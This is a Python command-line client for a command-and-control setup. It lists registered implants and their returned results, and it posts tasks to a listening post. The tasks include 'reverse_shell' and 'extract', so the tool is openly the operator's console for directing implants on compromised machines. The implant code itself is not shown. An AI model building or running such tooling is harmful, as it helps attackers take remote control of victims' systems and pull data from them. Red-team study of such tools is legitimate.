import click
import requests
import pprint
import json

# Configuration Settings
listening_post_addr = "http://127.0.0.1:8080"

# Helper functions
def api_get_request(endpoint):
    response_raw = requests.get(listening_post_addr + endpoint).text
    response_json = json.loads(response_raw)
    return response_json

def api_post_request(endpoint, payload):
    response_raw = requests.post(listening_post_addr + endpoint, json=payload).text
    if response_raw:
        return json.loads(response_raw)
    return None

# CLI commands and logic
@click.group()
def cli():
    pass

@click.command(name="list-implants")
def list_implants():
    """List the registered implants."""
    api_endpoint = "/api/user"
    print("\nHere are the registered implants:\n")
    pprint.pprint(api_get_request(api_endpoint))
    print()

@click.command(name="list-results")
def list_results():
    """List the results returned from the implant."""
    api_endpoint = "/api/result"
    print("\nHere's the results:\n")
    pprint.pprint(api_get_request(api_endpoint))
    print()

possible_tasks = ["ping", "reverse_shell", "extract"]

@click.command(name="add-tasks")
@click.option('--uid', help='ID of the implant to whom the task is destined.')
@click.option('--tasktype', help='Type of task to submit.')
def add_tasks(uid, tasktype):
    """Submit tasks to the listening post."""
    api_endpoint = "/api/task/add"

    if uid == None:
        print("[ERROR] You must provide an ID.")
        return
    if tasktype == None or tasktype not in possible_tasks:
        print("[ERROR] You must provide a tasktype.")
        print("Possible tasks are: ")
        print(possible_tasks)
        return
    
    request_payload_dict = {"uid": uid, "name": tasktype}
    request_payload = json.loads(json.dumps(request_payload_dict))
    print(request_payload)
    pprint.pprint(api_post_request(api_endpoint, request_payload))



# Add commands to CLI
cli.add_command(list_implants)
cli.add_command(list_results)
cli.add_command(add_tasks)

if __name__ == '__main__':
    cli()